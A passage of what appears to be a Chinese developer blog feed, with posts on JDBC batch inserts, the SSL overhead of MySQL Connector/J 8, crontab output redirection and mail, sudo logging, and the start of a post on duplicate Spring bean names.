class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.batchHasPlainStatements &amp;&amp; <span class="keyword">this</span>.rewriteBatchedStatements.getValue()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((PreparedQuery&lt;?&gt;) <span class="keyword">this</span>.query).getParseInfo().canRewriteAsMultiValueInsertAtSqlLevel()) &#123;</span><br><span class="line">      <span class="comment">// batch insert 重写</span></span><br><span class="line">      <span class="keyword">return</span> executeBatchedInserts(batchTimeout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.batchHasPlainStatements &amp;&amp; <span class="keyword">this</span>.query.getBatchedArgs() != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; <span class="keyword">this</span>.query.getBatchedArgs().size() &gt; <span class="number">3</span> <span class="comment">/* cost of option setting rt-wise */</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> executePreparedBatchAsMultiStatement(batchTimeout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> executeBatchSerially(batchTimeout);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.query.getStatementExecuting().set(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">  clearBatch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加事务"><a href="#添加事务" class="headerlink" title="添加事务"></a>添加事务</h2><p>之前执行都是自动提交的，相当于是多个事务，这次修改成一个单独的事务看看效果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@SneakyThrows</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testBatchWithTransaction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">    .newInstance();</span><br><span class="line">  <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">    <span class="comment">// 关闭事务的自动提交</span></span><br><span class="line">    conn.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">    Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"insert into words (word)  values(?)"</span>)) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        psts.setString(<span class="number">1</span>, <span class="string">"123"</span>);</span><br><span class="line">        psts.addBatch();</span><br><span class="line">      &#125;</span><br><span class="line">      psts.executeBatch();</span><br><span class="line">      <span class="comment">// 提交事务</span></span><br><span class="line">      conn.commit();</span><br><span class="line">      stopwatch.stop();</span><br><span class="line">      System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>General log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2020-05-03T06:58:19.567073Z  191 Queryinsert into words (word)  values(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>),(<span class="string">'123'</span>)</span><br><span class="line">2020-05-03T06:58:26.751411Z  191 Querycommit</span><br><span class="line">2020-05-03T06:58:26.784298Z  191 Queryrollback</span><br><span class="line">2020-05-03T06:58:26.828868Z  191 Quit</span><br></pre></td></tr></table></figure><p>执行时间：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stopwatch = 2236</span><br></pre></td></tr></table></figure><p>时间并没有提升，反倒有些下降，这个涉及的原因可能跟数据库的事务相关的各种配置有关系，后面再继续研究。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>executeBatch要和<code>rewriteBatchedStatements</code>或<code>allowMultiQueries</code>一起使用才有效果</li><li>executeBatch执行的sql太多时最好分批次，避免对jvm造成太大的压力</li><li>executeBatch执行的sql个数大于4</li></ul><img src="/2020/05/03/jdbc-batching/image-20200503183918245.png"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://my.oschina.net/u/2300159/blog/783613" rel="external nofollow noopener noreferrer" target="_blank">MySQL Jdbc驱动的rewriteBatchedStatements参数使batch生效 - 如风达的个人空间 - OSCHINA</a></li><li><a href="https://dev.mysql.com/doc/refman/5.6/en/insert-optimization.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL 5.6 Reference Manual :: 8.2.4.1 Optimizing INSERT Statements</a></li><li><a href="https://yq.aliyun.com/articles/131279" rel="external nofollow noopener noreferrer" target="_blank">Mysql 批量insert 性能测试-云栖社区-阿里云</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;批量处理&quot;&gt;&lt;a href=&quot;#批量处理&quot; class=&quot;headerlink&quot; title=&quot;批量处理&quot;&gt;&lt;/a&gt;批量处理&lt;/h2&gt;&lt;h3 id=&quot;批量插入&quot;&gt;&lt;a href=&quot;#批量插入&quot; class=&quot;headerlink&quot; title=&quot;批量插入&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="jdbc" scheme="http://qsli.github.io/categories/jdbc/"/>
    
    
      <category term="executeBatch" scheme="http://qsli.github.io/tags/executeBatch/"/>
    
  </entry>
  
  <entry>
    <title>mysql jdbc驱动参数性能调优</title>
    <link href="http://qsli.github.io/2020/05/03/jdbc-connector/"/>
    <id>http://qsli.github.io/2020/05/03/jdbc-connector/</id>
    <published>2020-05-03T00:46:01.000Z</published>
    <updated>2020-05-03T05:06:50.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSL对性能的影响"><a href="#SSL对性能的影响" class="headerlink" title="SSL对性能的影响"></a>SSL对性能的影响</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>我将驱动从</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>升级到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样的sql（for循环写库），执行时间从<code>18607</code>上升至<code>46000</code>, 时间翻了一倍还多。wireshark抓包之后发现，之后的包都不是mysql协议的（看不到具体内容了）：<br><img src="/2020/05/03/jdbc-connector/image-20200503084506187.png"></p><p>打开网络调试，<code>-Djavax.net.debug=all</code>，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> AA CB 5A 46 58 C1 55   BD DC 3F 8A 03 03 03 03  ...ZFX.U..?.....</span><br><span class="line">main, WRITE: TLSv1.2 Application Data, length = 96</span><br><span class="line">[Raw write]: length = 101</span><br><span class="line">0000: 17 03 03 00 60 33 3D D6   C6 D6 59 F1 48 C5 07 BC  ....`3=...Y.H...</span><br><span class="line">0010: BA 2C 95 88 C4 60 FC 83   5A CB B3 EA 52 C3 9C F6  .,...`..Z...R...</span><br><span class="line">0020: 96 8B A4 85 01 EE 22 E5   4B 36 DD 26 87 46 F1 FD  ......<span class="string">".K6.&amp;.F..</span></span><br><span class="line"><span class="string">0030: E9 E9 42 DA 51 D7 96 10   F4 6D F5 FF 81 DE F0 5E  ..B.Q....m.....^</span></span><br><span class="line"><span class="string">0040: 9D BE 8D 08 77 05 B7 A0   14 2F 38 AC 50 D8 DA E0  ....w..../8.P...</span></span><br><span class="line"><span class="string">0050: D1 7C 0D B8 07 E2 8B 05   7C 8E 1E D5 71 FA 48 21  ............q.H!</span></span><br><span class="line"><span class="string">0060: FC A5 FF 91 0F                                     .....</span></span><br><span class="line"><span class="string">[Raw read]: length = 5</span></span><br><span class="line"><span class="string">0000: 17 03 03 00 40                                     ....@</span></span><br><span class="line"><span class="string">[Raw read]: length = 64</span></span><br><span class="line"><span class="string">0000: 46 0D 04 E4 49 AE 5A DB   3C 0B 36 59 23 62 55 3C  F...I.Z.&lt;.6Y#bU&lt;</span></span><br><span class="line"><span class="string">0010: B9 C0 AC A2 EF 04 28 51   28 0F C0 7C A8 37 58 0B  ......(Q(....7X.</span></span><br><span class="line"><span class="string">0020: 1D 28 49 A1 41 CD 61 85   B7 7A A7 CA A9 8C 8B 3D  .(I.A.a..z.....=</span></span><br><span class="line"><span class="string">0030: 5E 99 92 50 6E F2 23 86   1F 8F 1A 2F 6F 41 C7 BB  ^..Pn.#..../oA..</span></span><br><span class="line"><span class="string">main, READ: TLSv1.2 Application Data, length = 64</span></span><br><span class="line"><span class="string">Padded plaintext after DECRYPTION:  len = 64</span></span><br><span class="line"><span class="string">0000: 44 F8 0A ED 84 81 F4 1B   6E 87 73 BA A1 67 71 95  D.......n.s..gq.</span></span><br><span class="line"><span class="string">0010: 0A 00 00 01 00 01 FD 3C   B7 02 01 00 00 00 BA 36  .......&lt;.......6</span></span><br><span class="line"><span class="string">0020: 13 72 F5 7D 3A B7 11 69   F4 EE 87 38 FB A3 5A 29  .r..:..i...8..Z)</span></span><br><span class="line"><span class="string">0030: 6B 7F A5 D3 59 E1 28 5C   B2 74 F8 E8 F4 9E 01 01  k...Y.(\.t......</span></span><br><span class="line"><span class="string">Padded plaintext before ENCRYPTION:  len = 96</span></span><br><span class="line"><span class="string">0000: 60 74 1B E8 4E D3 47 52   EA 95 B9 FC 26 11 DA 20  `t..N.GR....&amp;.. </span></span><br><span class="line"><span class="string">0010: 28 00 00 00 03 69 6E 73   65 72 74 20 69 6E 74 6F  (....insert into</span></span><br><span class="line"><span class="string">0020: 20 77 6F 72 64 73 20 28   77 6F 72 64 29 20 20 76   words (word)  v</span></span><br><span class="line"><span class="string">0030: 61 6C 75 65 73 28 27 31   32 33 27 29 70 0D 4F 3B  alues('123')p.O;</span></span><br><span class="line"><span class="string">0040: 1D C3 CF E4 79 19 7E 1C   CC 66 A3 26 1C 81 38 C5  ....y....f.&amp;..8.</span></span><br><span class="line"><span class="string">0050: 47 52 89 4C FC 0B C9 00   39 CD 3E A9 03 03 03 03  GR.L....9.&gt;.....</span></span><br><span class="line"><span class="string">main, WRITE: TLSv1.2 Application Data, length = 96</span></span><br><span class="line"><span class="string">[Raw write]: length = 101</span></span><br></pre></td></tr></table></figure><p>默认就把SSL打开了</p><blockquote><p><em>For 8.0.13 and later:</em> As long as the server is correctly configured to use SSL, there is no need to configure anything on the Connector/J client to use encrypted connections.</p></blockquote><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><blockquote><p>Connector/J can encrypt all data communicated between the JDBC driver and the server (except for the initial handshake) using SSL. There is a <strong>performance penalty</strong> for enabling connection encryption, the severity of which depends on multiple factors including (but not limited to) the size of the query, the amount of data returned, the server hardware, the SSL library used, the network bandwidth, and so on.</p></blockquote><p>这里有一个测试，<a href="https://www.percona.com/blog/2013/10/10/mysql-ssl-performance-overhead/" rel="external nofollow noopener noreferrer" target="_blank">SSL Performance Overhead in MySQL</a>，贴下对比：</p><img src="/2020/05/03/jdbc-connector/sysbench-throughput.png"><img src="/2020/05/03/jdbc-connector/sysbench-response-time.png"><img src="/2020/05/03/jdbc-connector/connection-throughput.png"><h3 id="如何关闭："><a href="#如何关闭：" class="headerlink" title="如何关闭："></a>如何关闭：</h3><blockquote><p><strong>useSSL</strong></p><p>For 8.0.12 and earlier: Use SSL when communicating with the server (true/false), default is ‘true’ when connecting to MySQL 5.5.45+, 5.6.26+ or 5.7.6+, otherwise default is ‘false’.</p><p>For 8.0.13 and later: Default is ‘true’. DEPRECATED. See sslMode property description for details.</p><p>Default: true</p><p>Since version: 3.0.2</p></blockquote><p>useSSL设置为false之后，就关闭了加密，之前的sql时间也降到了<code>22541</code></p><h2 id="useLocalSessionState"><a href="#useLocalSessionState" class="headerlink" title="useLocalSessionState"></a>useLocalSessionState</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.percona.com/blog/2013/10/10/mysql-ssl-performance-overhead/" rel="external nofollow noopener noreferrer" target="_blank">SSL Performance Overhead in MySQL</a></li><li><a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-using-ssl.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL Connector/J 8.0 Developer Guide :: 6.7 Connecting Securely Using SSL</a></li><li><a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" rel="external nofollow noopener noreferrer" target="_blank">MySQL :: MySQL Connector/J 8.0 Developer Guide :: 6.3 Configuration Properties</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSL对性能的影响&quot;&gt;&lt;a href=&quot;#SSL对性能的影响&quot; class=&quot;headerlink&quot; title=&quot;SSL对性能的影响&quot;&gt;&lt;/a&gt;SSL对性能的影响&lt;/h2&gt;&lt;h3 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="jdbc" scheme="http://qsli.github.io/categories/jdbc/"/>
    
    
      <category term="java-connector" scheme="http://qsli.github.io/tags/java-connector/"/>
    
  </entry>
  
  <entry>
    <title>crontab和邮件</title>
    <link href="http://qsli.github.io/2020/05/01/crontab/"/>
    <id>http://qsli.github.io/2020/05/01/crontab/</id>
    <published>2020-05-01T14:15:28.000Z</published>
    <updated>2020-05-01T14:15:28.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crontab是什么"><a href="#crontab是什么" class="headerlink" title="crontab是什么"></a>crontab是什么</h1><p>linux下的定时任务执行</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*     *     *   *    *        <span class="built_in">command</span> to be executed</span><br><span class="line">-     -     -   -    -</span><br><span class="line">|     |     |   |    |</span><br><span class="line">|     |     |   |    +----- day of week (0 - 6) (Sunday=0)</span><br><span class="line">|     |     |   +------- month (1 - 12)</span><br><span class="line">|     |     +--------- day of        month (1 - 31)</span><br><span class="line">|     +----------- hour (0 - 23)</span><br><span class="line">+------------- min (0 - 59)</span><br></pre></td></tr></table></figure><p>在线<code>crontab</code>表达式生成： </p><img src="/2020/05/01/crontab/image-20200501221243150.png"><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p><code>crontab</code>的输出分为三种：</p><ul><li>1 代表标准输出(<code>stdout</code>)</li><li>2代表错误输出(<code>stderr</code>)</li><li><strong>&amp;</strong> 表示等同于的意思，2&gt;&amp;1表示将标准错误输出重定向到标准输出stdout</li></ul><h2 id="重定向stdout"><a href="#重定向stdout" class="headerlink" title="重定向stdout"></a>重定向stdout</h2><h3 id="为何重定向"><a href="#为何重定向" class="headerlink" title="为何重定向"></a>为何重定向</h3><p><code>crontab</code>的输出如果没有重定向到<code>/dev/null</code><strong>就会发送邮件</strong>, crontab的标准输出一般不太关心，可以重定向。</p><p>邮件内容一般存储在 <code>/var/mail/$user</code> 中，如果不清理就会打满服务器根分区，最终导致机器无法登陆。</p><h2 id="如何重定向"><a href="#如何重定向" class="headerlink" title="如何重定向"></a>如何重定向</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 0 * * *  sh /home/q/tools/bin/zip_homeq_log_daily.sh 1&gt;/dev/null</span><br></pre></td></tr></table></figure><p>标准输出流重定向到空设备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash test.sh &gt;test.out     //脚本的标准输出写入到文件test.out ,标准错误输出直接打印在屏幕 等价于：bash test.sh 1&gt;test.out</span><br><span class="line">bash test.sh &gt;test.out 2&gt;&amp;1 //标准输出和标准错误输出都写入到test.out并且不会互相覆盖，等价于 bash test.sh &amp;&gt;test.out</span><br><span class="line">bash test.sh &gt;test.out 2&gt;test.out //标准输出和标准错误输出都写入到test.out，会出现互相覆盖的问题，正常情况不推荐这样使用</span><br><span class="line">bash test.sh &amp;&gt;test.out //等价于第二种方法</span><br></pre></td></tr></table></figure><h2 id="不要重定向stderr"><a href="#不要重定向stderr" class="headerlink" title="不要重定向stderr"></a>不要重定向stderr</h2><p><code>stderr</code>可能就是脚本执行过程中发生了错误， 这个是需要关注的， 最好不要重定向到空设备。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 7 * * * sh /home/q/tools/bin/carnival/carnival.sh 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><strong>最好不要这样做！</strong></p><p>当<code>stderr</code>中有输出时，需要发送邮件，必须指定邮件的接收人。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># crontab -e -u root</span></span><br><span class="line">MAILTO=<span class="string">"qisheng.li@yaduo.com,fan.zhang@yaduo.com"</span></span><br><span class="line">*/3 * * * * /bin/sh /datadisk/mv.sh 1&gt;/dev/null</span><br></pre></td></tr></table></figure><p>当脚本执行发生错误的时候，邮箱里就有一封邮件。</p><img src="/2020/05/01/crontab/image-20180813104941719.png"><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://serverfault.com/questions/133058/how-to-send-the-output-from-a-cronjob-to-multiple-e-mail-addresses" rel="external nofollow noopener noreferrer" target="_blank">email - How to send the output from a cronjob to multiple e-mail addresses? - Server Fault</a></li><li><a href="http://mengalong.github.io/2018/10/31/crontab-redirect/" rel="external nofollow noopener noreferrer" target="_blank">Linux crontab 输出重定向不生效问题解决 — Mengalong</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;crontab是什么&quot;&gt;&lt;a href=&quot;#crontab是什么&quot; class=&quot;headerlink&quot; title=&quot;crontab是什么&quot;&gt;&lt;/a&gt;crontab是什么&lt;/h1&gt;&lt;p&gt;linux下的定时任务执行&lt;/p&gt;
&lt;h2 id=&quot;语法&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="crontab" scheme="http://qsli.github.io/tags/crontab/"/>
    
  </entry>
  
  <entry>
    <title>配置sudo.log</title>
    <link href="http://qsli.github.io/2020/05/01/sudo-log/"/>
    <id>http://qsli.github.io/2020/05/01/sudo-log/</id>
    <published>2020-05-01T08:50:02.000Z</published>
    <updated>2020-05-01T08:50:02.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><h2 id="配置-sudo-log"><a href="#配置-sudo-log" class="headerlink" title="配置 sudo.log"></a>配置 sudo.log</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-test-01-pms <span class="built_in">log</span>]<span class="comment"># touch /var/log/sudo.log</span></span><br><span class="line">[root@yd-test-01-pms <span class="built_in">log</span>]<span class="comment"># visudo</span></span><br></pre></td></tr></table></figure><p><code>visudo</code>有语法检查，比直接修改 <code>/etc/sudoers</code>要安全些， 在末尾加入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Defaults logfile=/var/<span class="built_in">log</span>/sudo.log    <span class="comment">#增加日志输出地址</span></span><br></pre></td></tr></table></figure><p>可以测试下是否生效:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-test-01-pms <span class="built_in">log</span>]<span class="comment"># sudo yum install -y sl</span></span><br></pre></td></tr></table></figure><p>然后查看sudo.log</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-test-01-pms <span class="built_in">log</span>]<span class="comment"># cat sudo.log</span></span><br><span class="line">Aug 21 10:54:05 : root : TTY=pts/0 ; PWD=/var/<span class="built_in">log</span> ; USER=root ; COMMAND=/bin/yum</span><br><span class="line">    install -y sl</span><br><span class="line">Aug 21 10:54:25 : root : TTY=pts/0 ; PWD=/var/<span class="built_in">log</span> ; USER=root ;</span><br><span class="line">    COMMAND=/bin/less sudo.log</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://note.t4x.org/system/sudo-log-config/" rel="external nofollow noopener noreferrer" target="_blank">Centos 6.4 sudo 日志文件配置方法 | Byrd’s Weblog</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;日志&quot;&gt;&lt;a href=&quot;#日志&quot; class=&quot;headerlink&quot; title=&quot;日志&quot;&gt;&lt;/a&gt;日志&lt;/h1&gt;&lt;h2 id=&quot;配置-sudo-log&quot;&gt;&lt;a href=&quot;#配置-sudo-log&quot; class=&quot;headerlink&quot; title=&quot;配置 
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="sudo-log" scheme="http://qsli.github.io/tags/sudo-log/"/>
    
  </entry>
  
  <entry>
    <title>Spring中bean name重复的问题</title>
    <link href="http://qsli.github.io/2020/04/29/spring-bean-duplic-name/"/>
    <id>http://qsli.github.io/2020/04/29/spring-bean-duplic-name/</id>
    <published>2020-04-29T05:10:58.000Z</published>
    <updated>2020-04-29T05:10:58.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.atour.oss.dao.mapper.OssFileMapper.insert</span><br><span class="line"></span><br><span class="line">at org.apache.ibatis.binding.MapperMethod<span class="variable">$SqlCommand</span>.&lt;init&gt;(MapperMethod.java:227)</span><br><span class="line">at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:49)</span><br><span class="line">at org.apache.ibatis.binding.MapperProxy.cachedMapperMethod(MapperProxy.java:65)</span><br><span class="line">at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:58)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy188</span>.insert(Unknown Source)</span><br></pre></td></tr></table></figure><p>一个同事新加了一个数据源，然后老的数据源居然报错了，他说没有改动老的。翻了下代码，最后发现是<strong>不加思索地复制粘贴</strong>埋的坑，老的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(basePackages = MapperConfig.PACKAGE, sqlSessionFactoryRef = <span class="string">"sessionFactory"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span 